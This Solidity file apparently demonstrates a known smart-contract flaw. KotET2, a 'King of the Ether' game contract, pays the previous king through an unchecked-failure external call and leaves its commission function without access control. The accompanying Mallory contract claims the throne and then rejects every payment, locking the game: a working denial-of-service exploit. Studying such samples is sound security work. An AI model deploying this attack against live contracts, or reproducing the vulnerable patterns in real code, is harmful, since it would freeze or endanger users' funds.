pragma solidity ^0.4.2;

contract KotET2 {
  address public king;  
  uint public claimPrice = 100;
  address owner;

  function KotET2() payable{ 
    owner = msg.sender;  
    king = msg.sender;
    if (msg.value<1 ether) throw;
  }
   
  function sweepCommission(uint amount)  {
    bool res = owner.send(amount);
  }  

  function() payable {     
    if (msg.value < claimPrice) throw;
    
    uint compensation = calculateCompensation();     
    if (!king.call.value(compensation)()) throw;  
    king = msg.sender;        
    claimPrice = calculateNewPrice();    
  }  
  
  function calculateCompensation() private returns(uint) {
    return claimPrice+100;
  }
  
  function calculateNewPrice()  private returns(uint) {
    return claimPrice+200;
  }
  // Helper function to check the balance of this contract
  function getBalance() public view returns (uint) {
      return address(this).balance;
  }
}

contract Mallory {
    
  function unseatKing(address king, uint w)payable{
    bool res = king.call.value(w)();
  }
    
  function() payable {
    throw;
  }
  // Helper function to check the balance of this contract
  function getBalance() public view returns (uint) {
      return address(this).balance;
  }
}